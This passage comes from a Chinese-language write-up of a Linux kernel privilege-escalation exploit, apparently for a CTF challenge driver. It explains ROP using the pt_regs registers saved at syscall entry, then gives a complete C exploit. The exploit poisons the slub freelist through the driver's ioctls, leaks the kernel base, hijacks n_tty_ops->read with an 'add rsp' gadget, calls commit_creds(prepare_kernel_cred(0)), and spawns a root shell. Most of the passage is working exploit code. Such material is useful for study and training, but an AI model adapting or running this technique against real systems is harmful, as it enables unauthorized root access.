        unsigned long r11;
        unsigned long r10;
        unsigned long r9;
        unsigned long r8;
        unsigned long rax;
        unsigned long rcx;
        unsigned long rdx;
        unsigned long rsi;
        unsigned long rdi;
    /*
     * On syscall entry, this is syscall#. On CPU exception, this is error code.
     * On hw interrupt, it's IRQ number:
     */
        unsigned long orig_rax;
    /* Return frame for iretq */
        unsigned long rip;
        unsigned long cs;
        unsigned long eflags;
        unsigned long rsp;
        unsigned long ss;
    /* top of stack page */
    };
在内核栈上的结构如下：
我们都知道，内核栈 **只有一个页面的大小** ，而 pt_regs 结构体则固定位于 **内核栈栈底** ，当我们劫持内核结构体中的某个函数指针时（例如
seq_operations->start），在我们通过该函数指针劫持内核执行流时 **rsp 与 栈底的相对偏移通常是不变的**
而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15， **这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：**
  * **只需要寻找到一条形如 “add rsp, val ; ret” 的 gadget 便能够完成 ROP**
最后使用 `swapgs_restore_regs_and_return_to_usermode` 完成调栈，利用内核栈底数据平稳降落回用户态
    puts("\033[34m\033[1m[*] Start attacking n_tty_ops...\033[0m");
        alloc(dev_fd[1], &data); // get a new page for slub
        close(dev_fd[1]);
        data.ptr[0] = kernel_offset + N_TTY_READ_ADDR - 0x20;
        data.offset = 0;
        data.length = 0x8;
        edit(dev_fd[2], &data);
        alloc(dev_fd[2], &data);
        alloc(dev_fd[2], &data);
        data.ptr[0] = NULL;
        data.ptr[1] = kernel_offset + N_TTY_OPEN;
        data.ptr[2] = kernel_offset + N_TTY_CLOSE;
        data.ptr[3] = kernel_offset + N_TTY_FLUSH_BUFFER;
        data.ptr[4] = add_rsp_0xc8_ret; // hijack there
        data.length = 0x28;
        edit(dev_fd[2], &data);
        puts("\033[34m\033[1m[*] Start hijacking RIP...\033[0m");
        pop_rdi_ret = POP_RDI_RET + kernel_offset;
        prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;
        xchg_rax_rdi_ret = XCHG_RAX_RDI_RET + kernel_offset;
        commit_creds = COMMIT_CREDS + kernel_offset;
        swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + 0xc - 2;
        __asm__(
            "mov r15,   pop_rdi_ret;"
            "xor r14,   r14;"
            "mov r13,   prepare_kernel_cred;"
            "mov r12,   xchg_rax_rdi_ret;"
            "mov rbp,   commit_creds;"
            "mov rbx,   swapgs_restore_regs_and_return_to_usermode;"
            "mov r11,   0x66666666;"
            "mov r10,   0x77777777;"
            "mov r9,    0x88888888;"
            "mov r8,    0x99999999;"
            "xor rax,   rax;"
            "mov rcx,   0xaaaaaaaa;"
            "mov rdx,   0x8;"
            "mov rsi,   rsp;"
            "xor rdi,   rdi;"
            "syscall"
        );
#### Step.V 修复 n_tty_ops 完成稳定化提权
现在我们已经完成了提权并成功回到了用户态，看起来只需要直接起一个 root shell 便能为所欲为了，实则不然， **我们与终端间的交互要大量调用到
n_tty_ops 中的函数，而其 read 指针已经被我们破坏掉了** ，因此我们最后需要将其修复回 `n_tty_read`，完成稳定化提权
    // now we need to repair the n_tty_read
        puts("[*] Now repairing n_tty_ops...");
        data.ptr[4] = N_TTY_READ + kernel_offset;
        edit(dev_fd[2], &data);
        puts("[+] Done.");
        puts("\033[34m\033[1m[*]Execve root shell now...\033[0m");
        system("/bin/sh");
#### FINAL EXPLOIT
最终的 exp 如下：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define MODPROBE_PATH 0xffffffff82444700
    #define N_TTY_OPEN 0xffffffff81466710
    #define N_TTY_CLOSE 0xffffffff81464dc0
    #define N_TTY_FLUSH_BUFFER 0xffffffff814654b0
    #define N_TTY_READ 0xffffffff81465a10
    #define N_TTY_READ_ADDR 0xffffffff824b1190
    #define PREPARE_KERNEL_CRED 0xffffffff8108a9a0
    #define POP_RDI_RET 0xffffffff81001518
    #define COMMIT_CREDS 0xffffffff8108a660
    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00a2f
    #define XCHG_RAX_RDI_RET 0xffffffff8148c492
    #define ADD_RSP_0XC8_RET 0xffffffff811454aa
    size_t prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode;
    size_t pop_rdi_ret, xchg_rax_rdi_ret;
    size_t add_rsp_0xc8_ret;
    int dev_fd[5];
    size_t buf[0x100];
    size_t kernel_heap_leak, kernel_heap_search, kernel_text_leak, kernel_cred_leak;
    size_t page_offset_base, kernel_base, kernel_offset;
    struct Data
    {
        size_t *ptr;
        unsigned int offset;
        unsigned int length;
    }data;
    void alloc(int dev_fd, struct Data *data)
    {
        ioctl(dev_fd, 0x1111111, data);
    }
    void edit(int dev_fd, struct Data *data)
    {
        ioctl(dev_fd, 0x6666666, data);
    }
    void get(int dev_fd, struct Data *data)
    {
        ioctl(dev_fd, 0x7777777, data);
    }
    int main(int argc, char **argv, char *envp)
    {
        for (int i = 0; i next to be NULL to avoid the crash in allocating
        data.offset = 0;
        data.length = 8;
        edit(dev_fd[1], &data);
        alloc(dev_fd[1], &data);
        alloc(dev_fd[1], &data);
        data.length = 0x50;
        get(dev_fd[1], &data);
        for (int i = 0; i < (0x50 / 8); i++)
            printf("[-----data dump-----][%d] %p\n", i, data.ptr[i]);
        if (data.ptr[0] != 0)
        {
            puts("\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!");
            system("/exp");
        }
        kernel_base = data.ptr[2] - 0x30;
        kernel_offset = kernel_base - 0xffffffff81000000;
        printf("\033[32m\033[1m[+] We got kernel base! It\'s at:\033[0m %p\n", kernel_base);
        printf("\033[32m\033[1m[+] kernel offset:\033[0m %p\n", kernel_offset);
        add_rsp_0xc8_ret = ADD_RSP_0XC8_RET + kernel_offset;
        puts("\033[34m\033[1m[*] Start attacking n_tty_ops...\033[0m");
        alloc(dev_fd[1], &data); // get a new page for slub
        close(dev_fd[1]);
        data.ptr[0] = kernel_offset + N_TTY_READ_ADDR - 0x20;
        data.offset = 0;
        data.length = 0x8;
        edit(dev_fd[2], &data);
        alloc(dev_fd[2], &data);
        alloc(dev_fd[2], &data);
        data.ptr[0] = NULL;
        data.ptr[1] = kernel_offset + N_TTY_OPEN;
        data.ptr[2] = kernel_offset + N_TTY_CLOSE;
        data.ptr[3] = kernel_offset + N_TTY_FLUSH_BUFFER;
        data.ptr[4] = add_rsp_0xc8_ret;
        data.length = 0x28;
        edit(dev_fd[2], &data);
        puts("\033[34m\033[1m[*] Start hijacking RIP...\033[0m");
        pop_rdi_ret = POP_RDI_RET + kernel_offset;
        prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;
        xchg_rax_rdi_ret = XCHG_RAX_RDI_RET + kernel_offset;
        commit_creds = COMMIT_CREDS + kernel_offset;
        swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + 0xc - 2;
        __asm__(
            "mov r15,   pop_rdi_ret;"
            "xor r14,   r14;"
            "mov r13,   prepare_kernel_cred;"
            "mov r12,   xchg_rax_rdi_ret;"
            "mov rbp,   commit_creds;"
            "mov rbx,   swapgs_restore_regs_and_return_to_usermode;"
            "mov r11,   0x66666666;"
            "mov r10,   0x77777777;"
            "mov r9,    0x88888888;"
            "mov r8,    0x99999999;"
            "xor rax,   rax;"
            "mov rcx,   0xaaaaaaaa;"
            "mov rdx,   0x8;"
            "mov rsi,   rsp;"
            "xor rdi,   rdi;"
            "syscall"
        );
        if (!getuid())
        {
            puts("\033[32m\033[1m[+] Successfully get the ROOT!\033[0m");
        }
        else
        {
            puts("\033[31m\033[1m[x]WE FAILED TO GET ROOT BUT WE SUCCESSFULLY LANDED BACK???REDICULOUS!\033[0m");
            exit(EXIT_FAILURE);
        }
        // now we need to repair the n_tty_read
        puts("[*] Now repairing n_tty_ops...");
        data.ptr[4] = N_TTY_READ + kernel_offset;
        edit(dev_fd[2], &data);
        puts("[+] Done.");
        puts("\033[34m\033[1m[*]Execve root shell now...\033[0m");
        system("/bin/sh");
    }
运行即可完成稳定化提权